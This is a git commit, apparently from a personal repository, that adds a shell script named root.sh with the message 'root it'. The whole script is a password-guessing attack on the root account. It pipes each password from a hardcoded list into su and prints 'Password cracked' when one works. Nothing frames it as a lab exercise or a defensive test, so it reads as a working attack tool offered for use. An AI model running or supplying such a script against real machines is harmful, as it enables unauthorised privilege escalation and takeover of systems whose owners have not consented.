817ea5c4fe9374fb03801e40641f2bb2e025f412
MOnu4AM <135576704+MOnu4AM@users.noreply.github.com>
2023-06-05 10:52:35 +0530

    Create root.sh
    root it

---
+++ root.sh
@@ -0,0 +1,16 @@
+#!/bin/sh
+
+target_username="root"
+
+password_list="123456789 danielle 123456 Fv67i_+28WRT0mY7x princesa diamond vcdkqhhqdtvxbc3c4mj3238gg"
+
+for password in $password_list; do
+    echo "$password" | su - "$target_username" -c "echo 'Successfully switched to $target_username'"
+    if [ $? -eq 0 ]; then
+        echo "Password cracked: $password"
+        exit 0
+    fi
+done
+
+echo "Password not found"
+exit 1
